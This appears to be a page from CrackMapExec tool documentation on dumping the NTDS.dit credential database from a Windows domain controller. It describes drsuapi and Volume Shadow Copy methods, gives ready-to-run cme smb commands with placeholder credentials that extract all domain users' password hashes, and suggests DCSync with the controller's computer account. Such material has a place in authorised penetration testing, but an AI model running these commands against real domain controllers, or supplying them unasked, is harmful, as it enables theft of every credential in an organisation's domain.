# Dump NTDS.dit

{% hint style="danger" %}
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
{% endhint %}

```
2 methods are available:   
(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
						additional drsuapi calls to convert the resultant linked-lists into readable format  
			vss - Uses the Volume Shadow copy Service  
```

```
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
You can also DCSYNC with the computer account of the DC
{% endhint %}
